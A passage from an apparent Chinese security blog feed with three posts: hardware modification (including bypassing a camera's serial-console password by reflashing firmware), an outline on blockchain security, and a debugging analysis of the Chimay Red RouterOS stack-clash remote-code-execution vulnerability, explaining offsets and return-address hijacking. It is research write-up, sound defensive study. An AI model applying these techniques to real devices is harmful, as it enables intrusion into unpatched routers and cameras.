src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613_174407.jpg" alt=""></p><h3 id="更换内存芯片"><a href="#更换内存芯片" class="headerlink" title="更换内存芯片"></a>更换内存芯片</h3><p>openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_15063822.jpg" alt=""></p><p>首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160529.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152140.jpg" alt=""></p><p>芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152132.jpg" alt=""></p><p>清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154431.jpg" alt=""></p><p>对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153819.jpg" alt=""></p><p>先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153823.jpg" alt=""></p><p>确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160657.jpg" alt=""></p><h3 id="刷编程器固件"><a href="#刷编程器固件" class="headerlink" title="刷编程器固件"></a>刷编程器固件</h3><p>在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_161309.jpg" alt=""></p><p>芯片放置在烧录座中，用烧录座连接编程器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154759.jpg" alt=""></p><p>编程器刷入固件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606164128.png" alt=""></p><h3 id="更换闪存芯片"><a href="#更换闪存芯片" class="headerlink" title="更换闪存芯片"></a>更换闪存芯片</h3><p>把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。<br>存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_171616.jpg" alt=""></p><h3 id="硬改完成"><a href="#硬改完成" class="headerlink" title="硬改完成"></a>硬改完成</h3><p>全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：<a href="http://192.168.1.1/" target="_blank" rel="noopener">http://192.168.1.1/</a> 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613191402.jpg" alt=""></p><p>openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。</p><h2 id="体外分离硬破摄像头"><a href="#体外分离硬破摄像头" class="headerlink" title="体外分离硬破摄像头"></a>体外分离硬破摄像头</h2><h3 id="修改方案-1"><a href="#修改方案-1" class="headerlink" title="修改方案"></a>修改方案</h3><p>在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614141635.jpg" alt=""></p><p>尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161328.jpg" alt=""></p><p>成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161037.jpg" alt=""></p><p>然而事情并不简单。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/sdfsdfsf5656.jpg" alt=""></p><p>固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614_115142.jpg" alt=""></p><h3 id="拆存储芯片"><a href="#拆存储芯片" class="headerlink" title="拆存储芯片"></a>拆存储芯片</h3><p>固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。<br>首先拆掉芯片，周围同样采用胶带保护一下。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161733.jpg" alt=""></p><h3 id="飞线芯片烧录座"><a href="#飞线芯片烧录座" class="headerlink" title="飞线芯片烧录座"></a>飞线芯片烧录座</h3><p>飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_161048.jpg" alt=""></p><p>飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_162135.jpg" alt=""></p><p>通电测试，发现机器一切正常，说明改造成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_163009.jpg" alt=""></p><h3 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a>烧录固件</h3><p>继续修改固件测试，修改的细节在之后固件修改章节会详细说明，<br>因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614133847.jpg" alt=""></p><h3 id="硬破成功"><a href="#硬破成功" class="headerlink" title="硬破成功"></a>硬破成功</h3><p>用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3265e34f0a9.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57a.jpg" alt=""></p><h2 id="魔改小米5手机加6G内存"><a href="#魔改小米5手机加6G内存" class="headerlink" title="魔改小米5手机加6G内存"></a>魔改小米5手机加6G内存</h2><h3 id="修改方案-2"><a href="#修改方案-2" class="headerlink" title="修改方案"></a>修改方案</h3><p>小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。</p><h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193306.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193313.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193540.jpg" alt=""></p><p>主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193901.jpg" alt=""></p><h3 id="拆内存芯片"><a href="#拆内存芯片" class="headerlink" title="拆内存芯片"></a>拆内存芯片</h3><p>拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。<br>)<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_141602.jpg" alt=""></p><p>取下芯片后，清洁焊盘。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_143142.jpg" alt=""></p><h3 id="植锡球"><a href="#植锡球" class="headerlink" title="植锡球"></a>植锡球</h3><p>BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_144833.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_145204.jpg" alt=""></p><h3 id="BGA焊接"><a href="#BGA焊接" class="headerlink" title="BGA焊接"></a>BGA焊接</h3><p>先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151437.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151701.jpg" alt=""></p><p>焊接完成后，使板子自然冷却，然后清洗干净。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_154349.jpg" alt=""></p><h3 id="魔改完成"><a href="#魔改完成" class="headerlink" title="魔改完成"></a>魔改完成</h3><p>装机，然后开机测试，一切正常，说明魔改成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57e.jpg" alt=""></p><h2 id="《物联网安全百科》"><a href="#《物联网安全百科》" class="headerlink" title="《物联网安全百科》"></a>《物联网安全百科》</h2><p>伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。<br>图书阅读:<a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a><br>项目地址:<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">https://github.com/yaseng/iot-security-wiki</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件修改" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E4%BF%AE%E6%94%B9/"/>
    
      <category term="硬改" scheme="http://yaseng.org/tags/%E7%A1%AC%E6%94%B9/"/>
    
      <category term="硬破" scheme="http://yaseng.org/tags/%E7%A1%AC%E7%A0%B4/"/>
    
      <category term="魔改" scheme="http://yaseng.org/tags/%E9%AD%94%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>浅谈区块链安全</title>
    <link href="http://yaseng.org/talking-about-blockchain-security.html"/>
    <id>http://yaseng.org/talking-about-blockchain-security.html</id>
    <published>2018-04-24T16:00:00.000Z</published>
    <updated>2018-06-29T11:07:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是区块链？区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。其最重要的特点：去中心化，为人类创造了一个最理想的货币，这是一个近乎完美的P2P网络，去中心化不需要第三方机构的参与，交易双方直接进行交易，这就大大缩短了时间，提高了效率。区块链在金融方面有着颠覆级的改变，在社会生活方面也有着不可想象的影响，区块链技术能使得交易数据完全公开透明，并可以提供完整的信息流，这样我们就可以清楚的看到在这其中是否存在了问题。在诸如：物流环节中保证货品的安全、优化运输路线和日程安排、小企业融资、商品溯源防伪等等方面都具有重要现实意义。</p><p>然而事物在外因的作用下，往往会朝无法预料的方向发展，从而背离初衷，中本聪当年恐怕无法想象自己发明的比特币，会被炒高到如此地步，在资本和利益的驱使下，以区块链之名，无数山寨币如雨后春笋般涌现，在缺乏市场监管和审查机制下，对区块链一无所知的资本家收割走了一波又一波韭菜，本应对社会发展起积极作用的技术，演变成了人们用来对赌的金融工具，人类逐利的本能在这场资本的盛宴中显露无遗。</p><p>区块链技术滥觞于电子货币领域，虽然去中心化的设计，使其具有足够的安全性，但因大量资本家入场，各类代币不受限制的发行，技术和安全意识却没有跟上，在矿力、钱包、交易等方面暴露出了许多安全风险，前段时间的BEC 智能合约爆发的数值溢出漏洞，使其60多亿市值一朝化为乌有，而同样基于ERC20智能合约的电子货币都存在类似的安全风险，而黑客攻击电子货币，非法窃取巨额财富的报道更是不绝于耳，因此区块链的安全问题，是任何一个参与者必须重视的。</p><p>本文只是作为一个门外汉的心态。基于目前的现实环境，对区块链和电子货币安全问题的一点想法，文中可能包含了诸多错误和不当之处，长见笑于大方，仅希望能对整个区块链安全行业做一点微小的贡献，以供同业者参考。</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h3><h4 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h4><h4 id="权限控制不当"><a href="#权限控制不当" class="headerlink" title="权限控制不当"></a>权限控制不当</h4><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><h3 id="交易所"><a href="#交易所" class="headerlink" title="交易所"></a>交易所</h3><h3 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h3><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h3><h3 id="山寨币"><a href="#山寨币" class="headerlink" title="山寨币"></a>山寨币</h3><h3 id="传统安全"><a href="#传统安全" class="headerlink" title="传统安全"></a>传统安全</h3><h2 id="区块链安全思考"><a href="#区块链安全思考" class="headerlink" title="区块链安全思考"></a>区块链安全思考</h2><h3 id="风控"><a href="#风控" class="headerlink" title="风控"></a>风控</h3><p>对异常交易的审计，做风控策略,防止漏洞利用。</p><h3 id="合约自动审计"><a href="#合约自动审计" class="headerlink" title="合约自动审计"></a>合约自动审计</h3><p>自动化的合约审计系统</p><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前而言，对于整个区块链的安全攻防还处于初级阶段，很多暴露出的问题都只是一些较为初级的安全缺陷，参考其他行业的安全态势发展，这是在正常不过的情形，事物的发展往往都遵循着渐变的过程，在今后对区块链的安全攻防可能会涉及到更底层更核心的深水区，这一过程需要所有的从业者从现在开始引起高度重视，也希望安全行业能够把更多的目光投向区块链，区块链技术是未来技术革新重要方向，希望其能够长足的发展，更好的应用于现实社会中。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>智能合约逆向  <a href="https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/" target="_blank" rel="noopener">https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;什么是区块链？区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。其最重要的特点：去中心化，为人类创造了一个最
      
    
    </summary>
    
      <category term="区块链安全" scheme="http://yaseng.org/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="区块链安全" scheme="http://yaseng.org/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能合约审计" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MikroTik RouterOS &lt; 6.38.4 (x86) 远程代码执行漏洞分析</title>
    <link href="http://yaseng.org/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html"/>
    <id>http://yaseng.org/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html</id>
    <published>2018-04-14T16:00:00.000Z</published>
    <updated>2018-06-29T10:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligence Agency)执行电子监视和网络战的细节活动和能力。Chimay Red是Vault 7中泄漏的CIA Hacking Tools中包含的一个用于exploit运行Router OS的MikroTik(MT) 路由器的一个工具，此工具可用来向MT路由器上传HIVE（Vault7中泄漏出的一个CIA远程控制工具）或者shellcode等payload。Vault7泄露的文档中只包含了<a href="https://wikileaks.org/ciav7p1/cms/page_16384604.html" target="_blank" rel="noopener">工具的使用手册</a>，但此工具并未公开。BigNerd95在github上的<a href="https://github.com/BigNerd95/Chimay-Red" target="_blank" rel="noopener">Chiamy Red项目</a>根据RouterOS的补丁对Chimay Red中使用的漏洞进行了揭露并给出了poc。</p><p>本文主要是对BigNerd95的Chiamy Red项目中使用的 Stack Clash Remote Code Execution漏洞及给出的exp进行细节分析。 环境搭建及使用的漏洞具体可参考<a href="https://github.com/BigNerd95/Chimay-Red/blob/36faf04e9ffb224811e0ac074a62126fdca7a92f/docs/ChimayRed.pdf" target="_blank" rel="noopener">这里</a>。此漏洞存在于RouterOS 6.38.4版本以下，在<a href="https://mikrotik.com/download/changelogs/current-release-tree" target="_blank" rel="noopener">6.38.5版本</a>中被修补。 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从BigNerd95给出的文档中，我们可以知道此漏洞存在于www二进制文件中的Request::readPostData函数中。我们可以使用Chiamy Red项目中的getROSbin.py工具从RouterOS镜像中提取www二进制文件，命令如下：<br><code>$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary</code><br>使用IDA查看Request::readPostData函数 :<img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/1.png" alt="1"></p><p>可以看到，该函数先使用Headers::getHeader函数获取content_length字段的值，然后并未对值进行判断就传入了alloca函数，随后使用istream:read函数将content_len_velue长度的数据读取到了当前函数的栈帧中。</p><p>alloca函数具体进行的操作如下图:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/2.png" alt="2"><br>alloca函数将content_len_velue进行对齐之后，在当前栈帧上分配了对应大小的空间，这将允许我们直接控制当前栈帧的栈顶位置。</p><p>如果我们传入content_length的值为2147483648[-2147483648]到4294967295[-1]之间的任意值，则栈顶指针将不是向上增长而是向下移动指向已使用的栈区位置，然后istream::read会从socket读取content_len_velue长度的数据到当前栈顶指定的缓冲区内，这将引起栈粉碎。并且由于istream::read的第二个参数类型为uint，istream::read会读取至少2147483648字节的数据到栈上，这很明显会超出当前栈底，在istream::read函数返回之前生成一个SEGFAULT错误。现在看来这似乎是一个不可执行代码的漏洞，那么如何才能达到代码执行的目的呢？<br>可以先看一下Chiamy Red项目中的exp是怎么写的。如下图，先创建两个socket，分别向两个socket发送了指定了content_length的post header数据，并向s1发送了n个‘A’和payload，然后将s2关闭。从注释也可看出，其利用方式和线程栈有关。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/3.png" alt="3"></p><p>再来看看Request::readPostData函数是在哪里被调用的，使用IDA查看Request::readPostData的交叉引用发现www中没有引用此函数的位置。现在我们动态调试下，看看此函数在哪里被调用。telnet连接上RouterOS,把RouterOS的ALSR保护关闭掉，然后kill掉www进程之后系统会自动重启www程序（以下所有图片为多次调试www程序所截图像，所以进程号会有所不同，但并不影响我们的分析） </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/4.png" alt="4"></p><p>使用gdbserver附加到www进程上，使用gdb远程调试。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/5.png" alt="5"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/6.png" alt="6"></p><p>我们把断点下在调用alloca函数处 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/7.png" alt="7"></p><p>然后使用Chiamy Red项目中的exp把payload打到目标上 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/8.png" alt="8"></p><p>可以看到有两个新线程被创建，并且在线程2中触发了断点，说明Request::readPostData函数是在新线程中被调用的，并且栈顶寄存器指向0x77d86180 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/9.png" alt="9"></p><p>我们看一下0x77d86180在内存空间的哪个位置 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/10.png" alt="10"></p><p>可以看到0x77d86180并不位于进程内存空间的栈区，而是位于库文件加载区域中的一段空闲内存空间中，并且我们可以计算出分配给线程2的线程栈内存大小为0x77d87000-0x77d68000=0x1f000=124kb,继续运行www发现在线程3中断点又被触发了一次，且此次的栈顶寄存器指向0x77d66180，可以看到线程3的线程栈位于线程2的线程栈的上方且大小同为0x77d67000-0x77d48000=0x1f000=124kb,中间相隔0x77d68000-0x77d67000=0x1000=4kb的保护区。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/11.png" alt="11"></p><p>现在线程栈在内存空间中的布局清楚了。现在从新开启调试，在alloca调用处下断点，continue并且重新打上payload，程序中断在线程2的alloca调用处，向下单步3条指令 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/12.png" alt="12"></p><p>此时线程3中的断点被触发，并且调试线程切换到了线程3,因为我们现在要调试线程2,所以先把线程3暂停，设置gdb的调度器锁到on状态，然后切换回线程2继续调试 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/13.png" alt="13"></p><p>单步到sub %eax,%esp指令处查看当前esp的值为0x77d86180，对照进程的内存空间布局，可以看到现在esp依然指向线程2的线程栈内，单步步过sub指令，然后再次查看esp的值为0x77d5d170，现在esp已经指向线程3的线程栈内了<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/14.png" alt="14"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/15.png" alt="15"></p><p>继续向下运行到istream::read函数调用处，查看栈中函数的参数，可以看到read函数会读取0x29000字节的数据到0x77d5d170处，正好是刚才alloca函数调整过的栈顶位置 0x77d5d170 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/16.png" alt="16"></p><p>继续单步步过read函数，重新查看0x77d5d170处有什么数据，发现此位置的数据并没有更新，read函数读取失败了，我们先把这个问题暂时放在这里，继续我们下面的调试，因为我们主要关注地址偏移量 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/17.png" alt="17"></p><p>查看下exp脚本都向s1发送了什么数据，注意到发往s1的数据部分是分两次发送的，两次发送期间向s2发送了构造的http头，现在我们来计算一下向s1发送了n个‘A’之后，read函数会读取到多少个‘A’,由脚本的宏定义可以计算出SKIP_SPACE-ALIGN_SIZE-ADDRESS_SIZE=0xfec,read函数在读取0xfec个‘A’之后，edi寄存器指向的位置在0x77d5d170+0xfec=0x77d5e15c，注意read再往后读取的数据就是shellcode了，就是说0x77d5e15c是shellcode的起始位置，并且此位置位于线程3的线程栈内 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/18.png" alt="18"></p><p>现在切换到线程3,继续调试，看看0x77d5e15c在线程3的线程栈中扮演了什么角色 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/19.png" alt="19"></p><p>线程3的栈顶在经过调整之后指向0x77d5e170处，此处已经离0x77d5e15c不远了。继续运行到read函数的调用处，查看栈中的数据，发现此时栈顶指针指向0x77d5e160处，离0x77d5e15c只有四个字节，在调用call read指令后将read函数的返回地址存储到0x77d5e15c的位置，刚才分析到0x77d5e15c是shellcode的起始地址，此处可以劫持read函数的返回地址达到任意代码执行的目的。由于线程3的read函数会向0x77d5e170处写入数据，此处内存空间也是存储shellcode的空间，因此，不能向s2发送任何数据http协议的数据部分，否则将会赋盖shellcode，Chiamy Red项目中exp的作者使用close(s2)的方式来让线程3中的read函数返回，以运行shellcode。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/20.png" alt="20"></p><p>关于调试过程中出现的read函数读取失败的问题，可能是由于中断的时间太长导致socket超时引起的，直接把断点下在read函数调用下面，直接run至断点处，就能看到read函数读取成功了。</p><h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>最后正向梳理下exp作者的利用思路。传入负值可以复写当前线程栈的函数返回地址，但由于read函数的第二个参数类型为uint，写入内存的长度超长会在read函数返回之前就引发段错误导致程序异常退出；由于线程栈内存段是相邻的，且同一进程中的所有线程共享资源，那么可以赋写其他线程栈的函数返回地址，因为alloca函数可以分配栈空间，先通过content_length参数在线程2的线程栈上分配出容纳shellcode的内存空间，然后确定read函数的返回地址的存储位置ADDR，利用content_length调整线程1的线程栈栈顶寄存器指向ADDR之后的地址，然后使用‘A’作填充，使shellcode正好覆盖到ADDR处存储的返回地址达到任意代码执行的目的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligen
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="路由器漏洞" scheme="http://yaseng.org/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>谁是僵尸之王-如何进行高效的分布式爆破</title>
    <link href="http://yaseng.org/king-of-zombie.html"/>
    <id>http://yaseng.org/king-of-zombie.html</id>
    <published>2018-04-03T16:00:00.000Z</published>
    <updated>2018-06-29T10:31:52.000Z</updated>
    
